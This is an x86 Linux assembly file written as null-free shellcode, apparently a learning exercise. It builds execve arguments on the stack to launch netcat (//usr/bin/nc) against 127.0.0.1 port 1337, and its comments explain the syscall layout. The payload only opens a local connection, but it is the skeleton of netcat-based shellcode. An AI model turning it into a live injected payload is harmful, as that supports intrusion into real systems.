; Author: @bugsam
; 05/17/2020

global _start                           ; define the entry point

section .text

_start:
        ; int execve(const char *pathname, char *const argv[], char *const envp[]);
        ; were I asked for a tip, I would say the most important thing about execve
        ; is  *argv[] is an array, where the first element of pointers is the binary
        ; name, the others are pointers to values in memory. 

        xor eax, eax
        push eax						; stack-frame NULL terminated
        push 0x37333331                 ; stack-frame 1337 (0x4 bytes)
        mov edx, esp                    ; EDX (*argv[2]
        push eax                        ; stack-frame NULL
        push 0x31302e30                 ; stack-frame 127.00.00.01 (0xc bytes)
        push 0x302e3030
        push 0x2e373231
        mov ecx, esp                    ; ECX (*argv[1]
        push eax                        ; stack-frame NULL
        push 0x7461636e                 ; strack-frame ncat
        mov ebx, esp                    ; EBX (*argv[0]
        push eax                        ; stack-frame NULL
        mov eax, esp                    ; EAX (*NULL)
        push edx                        ; stack-frame *argv[2]
        mov edx, eax                    ; EDX (*envp), as we hardcoded the full pathname it is not necessary
                                        ; to use environ, so envp[0] will be a NULL dword (in Linux it is allowed
                                        ; to set envp[] as NULL, in other systems it might result in an EFAULT
        push ecx                        ; stack-frame *argv[1]
        push ebx                        ; stack-frame *argv[0]
        mov ecx, esp                    ; ECX (*argv[0]), which is the first element of the array
        xor eax, eax
        push eax                        ; stack-frame NULL
        push 0x636e2f6e                 ; stack-frame //usr/bin/nc (0xc bytes)
        push 0x69622f72
        push 0x73752f2f
        mov ebx, esp                    ; EBX (*pathname), full path to process image that will be created.
        xor eax, eax
        mov al, 0xb                     ; EAX (11) syscall EXECVE
        int 0x80
        
        ; [STACK]
        ; NULL
        ; 1337
        ; NULL
        ; 127.00.00.01
        ; NULL
        ; ncat
        ; NULL
        ; POINTER (1337)
        ; POINTER (127.00.00.01)
        ; POINTER (ncat)
        ; NULL
        ; //usr/bin/nc
